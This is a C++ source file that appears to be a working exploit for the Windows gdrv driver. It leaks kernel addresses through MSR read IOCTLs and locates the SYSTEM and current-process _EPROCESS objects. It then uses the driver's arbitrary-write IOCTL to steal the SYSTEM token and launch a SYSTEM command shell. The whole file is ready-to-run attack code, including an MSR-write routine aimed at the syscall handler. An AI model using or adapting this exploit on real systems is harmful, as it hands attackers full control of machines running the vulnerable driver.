// gdrv_exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>

#define IOCTL_MmGetPhysicalAddress 0xC350280C
#define IOCTL_MmMapIoSpace         0xC3502000
#define IOCTL_MmMapIoSpace2        0xC3502840

// For ReadMSR():
// IOCTL IOCTL 0xC3502580
// InputBufferLength == OutputBufferLength && InputBufferLength == 16
// can be used to leak the IA32_LSTAR MSR address 
#define IOCTL_readmsr_caller       0xC3502580   

// For WriteMSR():
// IOCTL 0xC3502580
// *(DWORD*)PSystemBuffer == 1
// can be used to write the IA32_LSTAR MSR and overwrite KiSystemCall64() address
#define IOCTL_writemsr_caller      0xC3502580   

#define IOCTL_ZwUnmapViewOfSection 0xC3502008
#define IOCTL_ArbitraryWrite       0xC3502808 

#pragma comment(lib, "ntdll")

#define SystemHandleInformation 0x10
//#define SystemHandleInformationSize 1024 * 1024 * 2

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

extern "C" NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;



ULONG_PTR ReadMSR(DWORD MSRIndex)
{
    printf("[*] in ReadMSR()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }
    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    InputBuffer[0] = 1; // 1 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_readmsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        printf("[+] ReadMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_readmsr_caller);

        DWORD HighDWORD = OutputBuffer[3];
        DWORD LowDWORD = OutputBuffer[2];

        UINT64 KiSystemCall64Address = ((UINT64)HighDWORD << 32) | (UINT64)LowDWORD;
        printf("[+] Leaked nt!KiSystemCall64 address: 0x%p\n", KiSystemCall64Address);

        // --- Clearing and returning---
        free(InputBuffer);
        free(OutputBuffer);

        CloseHandle(hDevice);
        return KiSystemCall64Address;
    }

    printf("[-] Unable to call IOCTL 0x%x: GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);
    return -1;
}

ULONG_PTR LeakNtoskrnlBaseAddress()
{
    DWORD MSRIndex = 0xC0000082;
    ULONG_PTR KiSystemCall64Address = ReadMSR(MSRIndex);
    DWORD IAT_Offset = 0x40C600; // This might be different between versions of Windows !!!

    printf("[+] IAT offset of nt!KiSystemCall64: 0x%x\n", IAT_Offset);

    // ntoskrnl.exe base address can be found in IDA under: Edit -> Segments -> Rebase Program...
    ULONG_PTR BaseAddress = KiSystemCall64Address - IAT_Offset;
    printf("[+] Leaked ntoskrnl.exe base address: 0x%p\n", BaseAddress);

    return BaseAddress;
}

VOID WriteMSR(DWORD MSRIndex, ULONG_PTR Overwrite)
{
    printf("[*] in WriteMSR()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    DWORD* InputBuffer = (DWORD*)calloc(1, 0x10);
    DWORD* OutputBuffer = (DWORD*)calloc(1, 0x10);

    DWORD LowDWORD = (DWORD)(Overwrite & 0xFFFFFFFF);           // obtain lower DWORD of Overwrite variable
    DWORD HighDWORD = (DWORD)((Overwrite >> 32) & 0xFFFFFFFF);  // obtain higher DWORD of Overwrite variable

    InputBuffer[0] = 0;         // 0 is the value that invokes the ReadMSR() function in the driver
    InputBuffer[1] = MSRIndex;  // The MSR register index that we want to overwrite
    InputBuffer[2] = LowDWORD;  // Lower 32-bit value that the MSR will be overwritten with
    InputBuffer[3] = HighDWORD; // Higher 32-bit value that the MSR will be overwritten with

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_writemsr_caller, InputBuffer, 0x10, OutputBuffer, 0x10, &BytesReturned, nullptr))
    {
        DebugBreak();
        printf("[+] WriteMSR() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_writemsr_caller);
    }
    free(InputBuffer);
    free(OutputBuffer);

    CloseHandle(hDevice);

}

ULONG_PTR GetPhysicalAddress(ULONG_PTR VirtualAddress)
{
    printf("[+] in GetPhysicalAddress()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice2 = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice2 == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return -1;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 8);      // 8 bytes virtual address to be translated
    ULONG_PTR* OutputBuffer = (ULONG_PTR*)calloc(1, 8);

    //RtlCopyMemory(InputBuffer, &VirtualAddress, )
    DWORD BytesReturned = 0;
    DWORD PhysicalAddress = 0;
    if (DeviceIoControl(hDevice2, IOCTL_MmGetPhysicalAddress, &VirtualAddress, 8, OutputBuffer, 8, &BytesReturned, nullptr))
    {
        PhysicalAddress = *OutputBuffer;
        printf("[+] GetPhysicalAddress() DeviceIoControl (0x%x) executed successfully!\n", IOCTL_MmGetPhysicalAddress);
        printf("[+] Physical Address returned for 0x%p is: 0x%p\n", VirtualAddress, PhysicalAddress);

        free(InputBuffer);
        free(OutputBuffer);
        CloseHandle(hDevice2);
        return PhysicalAddress;
    }

    printf("[-] Unable to execute IOCTL_MmGetPhysicalAddress, GetLastError(): %u\n", GetLastError());
    free(InputBuffer);
    free(OutputBuffer);
    CloseHandle(hDevice2);

    return -1;

}

PVOID LeakProcessAddress(DWORD TargetPID)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    PSYSTEM_HANDLE_INFORMATION SystemInformation = NULL;
    NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
    ULONG SystemHandleInformationSize = 0x100000;

    PVOID ObjectAddress = NULL;
    DWORD PID = 0;

    do {
        if (SystemInformation)
            free(SystemInformation);

        SystemInformation = (PSYSTEM_HANDLE_INFORMATION)calloc(1, SystemHandleInformationSize);
        if (!SystemInformation) {
            printf("Memory allocation failed!\n");
            return NULL;
        }

        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
            SystemInformation, SystemHandleInformationSize, &SystemHandleInformationSize);

    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed with status: 0x%x\n", status);
        free(SystemInformation);
        return NULL;
    }

    for (int i = 0; i < SystemInformation->NumberOfHandles; i++)
    {
        PID = SystemInformation->Handles[i].UniqueProcessId;
        if (PID != TargetPID)
            continue;

        if (SystemInformation->Handles[i].ObjectTypeIndex == 7)
        {
            ObjectAddress = SystemInformation->Handles[i].Object;
            printf("[*] PID: %d | _EPROCESS Object Address: 0x%p\n", PID, ObjectAddress);
            break;
        }
        ;
    }
    if (!ObjectAddress)
        printf("[-] Object Address not found: GetLastError(): %u\n", GetLastError());

    CloseHandle(hProcess);
    free(SystemInformation);

    return ObjectAddress;
}

VOID ArbitraryWrite(ULONG_PTR SrcAddress, ULONG_PTR DstAddress, ULONG_PTR Size)
{
    printf("[*] In ArbitraryWrite()...\nPress Enter to continue...");
    getchar();

    //Name of the device might be different!!
    HANDLE hDevice = CreateFile(L"\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] Handle to the device couldn't be created: %u\n", GetLastError());
        return;
    }

    printf("[+] Handle to device \\\\.\\GIO was opened successfully!!\n");

    printf("[*] SrcAddress: 0x%p\n", SrcAddress);
    printf("[*] DstAddress: 0x%p\n", DstAddress);
    printf("[*] Size: 0x%p\n", Size);

    ULONG_PTR* InputBuffer = (ULONG_PTR*)calloc(1, 24);

    RtlCopyMemory((BYTE*)InputBuffer, &DstAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 8, &SrcAddress, 8);
    RtlCopyMemory((BYTE*)InputBuffer + 16, &Size, 4);

    printf("[*] InputBuffer[0]: %p\n", InputBuffer[0]);
    printf("[*] InputBuffer[1]: %p\n", InputBuffer[1]);
    printf("[*] InputBuffer[2]: %p\n", InputBuffer[2]);

    DWORD BytesReturned = 0;
    if (DeviceIoControl(hDevice, IOCTL_ArbitraryWrite, InputBuffer, 24, nullptr, 0, &BytesReturned, nullptr))
        printf("[+] DeviceIoControl() on 0x%x executed successfully!\n", IOCTL_ArbitraryWrite);
    else
        printf("[-] DeviceIoControl() on 0x%x failed with GetLastError(): %u\n", GetLastError());

    free(InputBuffer);
    CloseHandle(hDevice);
}


int main()
{
    printf("[*] Starting execution...\n");

    PVOID CurrentProcessObjectAddress = LeakProcessAddress(GetCurrentProcessId());
    PVOID SystemProcessObjectAddress = LeakProcessAddress((DWORD)4); // SYSTEM's PID = 4

    printf("[*] Current Process _EPROCESS (Virtual) Address: 0x%p\n", CurrentProcessObjectAddress);
    printf("[*] SYSTEM Process _EPROCESS (Virtual) Address: 0x%p\n", SystemProcessObjectAddress);

    ULONG_PTR SystemTokenAddress = (ULONG_PTR)SystemProcessObjectAddress + 0x4b8;
    ULONG_PTR CurrentProcessTokenAddress = (ULONG_PTR)CurrentProcessObjectAddress + 0x4b8;
    ULONG_PTR Size = 8;
    printf("[*] SYSTEM Token Address: 0x%p\n", SystemTokenAddress);
    printf("[*] Local Process Token Address: 0x%p\n", CurrentProcessTokenAddress);

    ArbitraryWrite(SystemTokenAddress, CurrentProcessTokenAddress, Size);
    printf("[+] Successfully overwritten Local Process Token with SYSTEM process Token!!\n");
    printf("[+] Press Enter to get SYSTEM shell...\n");
    getchar();
    system("cmd.exe");

    return 0;
}
